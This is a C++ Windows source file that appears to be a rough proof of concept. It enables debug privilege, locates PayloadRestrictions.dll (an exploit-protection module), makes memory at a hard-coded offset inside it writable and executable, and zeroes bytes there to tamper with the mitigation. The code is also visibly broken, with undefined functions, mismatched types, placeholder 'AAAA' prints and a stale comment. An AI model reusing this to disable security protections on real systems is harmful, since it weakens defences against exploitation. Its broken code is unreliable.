#include <Windows.h>
#include <ole2.h>
#include <iostream>
#include <stdio.h>   
#include <stdlib.h>  
#include <psapi.h> // To get process info
#include <winuser.h>
#include <cstdint>
#include <cstdio>

typedef NTSTATUS(NTAPI* _NtProtectVirtualMemory)(HANDLE, PVOID, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten);

DWORD GetBaseAddress(const HANDLE hProcess) {
	if (hProcess == NULL)
		return NULL; // No access to the process

	HMODULE lphModule[1024]; // Array that receives the list of module handles
	DWORD lpcbNeeded(NULL); // Output of EnumProcessModules, giving the number of bytes requires to store all modules handles in the lphModule array

	if (!EnumProcessModules(hProcess, lphModule, sizeof(lphModule), &lpcbNeeded))
		return NULL; // Impossible to read modules

	TCHAR szModName[MAX_PATH];
	if (!GetModuleFileNameEx(hProcess, lphModule[0], szModName, sizeof(szModName) / sizeof(TCHAR)))
		return NULL; // Impossible to get module info	

	return (DWORD)lphModule[0]; // Module 0 is apparently always the EXE itself, returning its address
}

int EnableDebugPrivilege2() {

	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tkp;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
		msg_print("OpenProcessToken fail");
		return 0;
	}

	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue)) {
		msg_print("LookupPrivilegeValue fail");
		return 0;
	}

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
		msg_print("AdjustTokenPrivileges fail");
		return 0;
	}

	return 1;
}

int main()
{
	HANDLE hProcess(NULL);
	DWORD processID(0);
	DWORD BaseAddress(NULL);

	EnableDebugPrivilege2();
	cout << "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n";
	cout << "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n";

	cout << "PID to read : ";
	cin >> processID;

	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
	HMODULE base = GetModuleHandleA(0);

	cout << "Base address: " << base << endl;
	//PrintModules(processID);
	
	HMODULE payload = GetModuleHandleA("Payloadrestrictions.dll");
	cout << payload << "\n";

	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	cout << ntdll << "\n";
	UINT_PTR adr = (UINT_PTR)payload+0xe4004;
	cout << "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n";
	printf("AAAAAAAAAAAAAAAAAAAAaaa 0x%08X\n", adr);


	//00001c10 - offset to olprotect
	

	// Variable to change the protection of. This is just a POC and will probably crash because a page at 0x12345678 is unlikely to exist in the current process.

	_NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)GetProcAddress(ntdll, "NtProtectVirtualMemory");
	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");

	ULONG oldProtection;
	NTSTATUS ntStatus;
	SIZE_T uSize = 0x10;
	ntStatus = NtProtectVirtualMemory(NtCurrentProcess(), &adr, &uSize, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (!NT_SUCCESS(ntStatus)) {
		printf("[-] NtProtectVirtualMemory - 1: Error.\n");
		return FALSE;
	}



	ULONG bytesWritten = 0;
	PVOID image;
	image = VirtualAlloc(NULL, 0x10, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(image, "\x00\x00\x00\x00\x00\x00\x00\x00\x00", 8);

	//ntStatus = NtWriteVirtualMemory(NtCurrentProcess(), (PVOID)adr, image, sizeof(image), &bytesWritten);
	//cout << bytesWritten;
	//if (!NT_SUCCESS(ntStatus)) {
	//	printf("[-] NtWriteVirtualMemory - 1: Error.\n");
	//	return FALSE;
	//}
	std::cout << std::hex << *((PDWORD64)(adr+4)) << "\n";
	*((PDWORD64)(adr + 4)) = 0X000000000000;

	std::cout << std::hex << *((PDWORD64)(adr + 4));

	/*
	fp func = (fp)heap;
	(*func)();
	*/
	system("pause");

	return 0;
}
